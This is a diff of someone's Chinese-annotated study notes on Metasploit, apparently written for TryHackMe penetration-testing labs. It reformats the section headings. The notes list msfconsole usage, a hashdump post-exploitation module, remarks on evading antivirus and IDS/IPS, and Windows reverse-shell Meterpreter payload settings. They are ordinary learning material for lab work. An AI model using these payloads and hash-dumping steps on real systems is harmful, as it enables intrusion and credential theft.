@@ -1,7 +1,4 @@
-Metasploit
---> sudo openvpn 2024_5_CTF/try_hack_me/gcvbnm123.ovpn
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
---> Metasploit: Introduction
+## Metasploit: Introduction
 	--> start : msfconsole
 
 	--> msfconsole: The main command-line interface
@@ -79,8 +76,7 @@ Metasploit
 	--> Meterpreter提示 : meterpreter >
 	--> 目標系統上的 shell： C:\Windows\system32>
 	
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
---> Metasploit: Exploitation
+## Metasploit: Exploitation
 	--> /usr/share/wordlists/metasploit
 	--> 2024_5_CTF/try_hack_me/Jr_Penetration_Tester/task/MetasploitWordlist.txt
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -211,8 +207,7 @@ Metasploit
 		--> back to 終端2 : meterpreter > 
 			--> run post/linux/gather/hashdump : 利用模組轉儲系統上其他使用者的雜湊值
 		
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
---> Metasploit: Meterpreter
+## Metasploit: Meterpreter
 	--> 避免在防毒掃描期間被偵測到
 	--> 避免被基於網路的 IPS（入侵防禦系統）和IDS （入侵偵測系統）
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -328,11 +323,11 @@ Metasploit
 		
 		--> TASK
 			--> sysinfo : 計算機名稱
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-PAYLOAD : 
-	set PAYLOAD windows/meterpreter/reverse_tcp
-	set PAYLOAD windows/shell/reverse_tcp 
-	set PAYLOAD windows/shell_reverse_tcp
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	PAYLOAD : 
+		set PAYLOAD windows/meterpreter/reverse_tcp
+		set PAYLOAD windows/shell/reverse_tcp 
+		set PAYLOAD windows/shell_reverse_tcp
 
 
 		
